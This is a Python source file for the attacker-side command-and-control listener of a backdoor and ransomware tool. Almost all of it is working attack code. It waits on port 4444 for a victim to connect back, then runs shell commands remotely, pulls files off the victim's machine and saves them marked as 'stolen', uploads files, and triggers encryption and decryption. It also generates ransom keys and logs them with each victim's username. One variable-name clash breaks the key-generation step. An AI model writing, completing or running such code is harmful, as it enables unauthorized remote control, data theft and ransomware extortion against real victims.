
import socket as s
import struct
import os as o
import time as ti
from cryptography.fernet import Fernet as f

#timeouts for s
t = 3.0
et = 60.0

#class for X sockets to connect to backdoor
class X:
    #Initilization of X
    def __init__(self, p, o) -> None:
        X = s.s(s.AF_INET, s.SOCK_STREAM)
        X.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
        X.bind((p, o))
        self.p, self.o = p, o
        X.listen(0)
        print("\n[+] Waiting for incoming connection")
        self.connection, address = X.accept()
        print(f"\n[+] Got a connection from {str(address)}")
        self.connection.settimeout(t)  

    #responsible for executing commands on victim's machine and recieving output
    def ex(self, c):
        self.connection.send(c.encode('utf-8'))
        try:
            response = self.connection.recv(2048)
            return response
        except s.timeout:
            return b"No output or timeout reached"

    #responsible for downloading file from victims machine and saving it
    def d(self, n, d):
        try:
            self.connection.settimeout(et) #extension of timeout
            try:
                file_size_data = self.connection.recv(8)
                file_size = struct.unpack('!Q', file_size_data)[0]  #finds file size
                print(f"Expected file size: {file_size} bytes")
            except Exception as err:
                print(err)

            self.connection.send(b"ready") #ready to recieve d

            n = n.split(sep=".")
            file_path = n[0] + "_stolen." + n[1]

            with open(file_path, "wb") as file: #wb for binary write
                bytes_received = 0
                while bytes_received < file_size:
                    chunk = self.connection.recv(min(4096, file_size - bytes_received))
                    if not chunk:
                        break
                    file.write(chunk)
                    bytes_received += len(chunk)
                    print(f"Received {bytes_received}/{file_size} bytes")

            print(f"File saved successfully and written to {file_path}")
            self.connection.settimeout(t)

        except Exception as err:
            print(f"Error occurred: {err}")

    #responsible for uploading file to victim's machine and saving it
    def u(self, n):
        try:
            self.connection.settimeout(et) #extension of timeout
            ti.sleep(5) #helps sync the d transfer
            file_size = o.path.getsize(n)
            self.connection.sendall(struct.pack('!Q', file_size)) 
            print(f"Sending file size: {file_size} bytes")

            #waits for the victim to be ready
            while True:
                is_ready = self.connection.recv(4096)
                if is_ready == b"ready":
                    break
            #reads in chunks of 4096 bytes
            with open(n, "rb") as file: #rb for binary read
                bytes_sent = 0
                while bytes_sent < file_size:
                    chunk = file.read(4096)
                    if not chunk:
                        break
                    self.connection.sendall(chunk)
                    bytes_sent += len(chunk)
                    print(f"Sent {bytes_sent}/{file_size} bytes")

            print(f"File '{n}' sent successfully")
            self.connection.settimeout(t)
        except Exception as err:
            return print(f"Error occurred during u: {err}")

    #initiates encryption/decryption on victims machine
    def e_d(self, c):
        try:
            self.connection.settimeout(et)
            result = self.ex(c)
            print(result.decode('utf-8', errors='ignore'))
            self.connection.settimeout(t)
        except Exception as err:
            print(f"error in e_d: {err}")

    #generates random ky and saves it to ransom_key.txt file along with p and username of victim
    def k(self):
        try:
            f = "ransom_keys.txt"
            ky = f.generate_key()
            ci = f(ky)
            ky = ky.decode("utf-8")
            
            user = self.ex("whoami").decode("utf-8")
            p = self.p
            
            with open(f, "a") as file:
                file.write(f"\n{user}\t\t{p}\t\t{ky}")

            print(f"The ky is {ky} and is saved in {f}")

        except Exception as err:
            print(f"An error occurrred: {err}")

    #Control of entire X
    def rrr(self):
        while True:
            c = input(">> ")
            cp = c.split(sep=" ")

            if cp[0] == "d":
                result = self.ex(c)
                self.d(cp[1], result)
                continue

            elif cp[0] == "u":
                result = self.ex(c)
                self.u(cp[1])
                try:
                    result = self.connection.recv(4096)
                except Exception as err:
                    print(f"error occurred: {err}")
                print(result.decode('utf-8', errors='ignore'))
                continue

            elif cp[0] == "gen":
                self.k()
                continue


            elif cp[0] == "enc" or cp[0] == "dec":
                self.e_d(c)
                continue

            elif cp[0] == "exit":
                print(f"closing connection")
                exit()
            result = self.ex(c)
            print(result.decode('utf-8', errors='ignore'))
           
mylistener = X("169.254.0.1", 4444)
mylistener.rrr()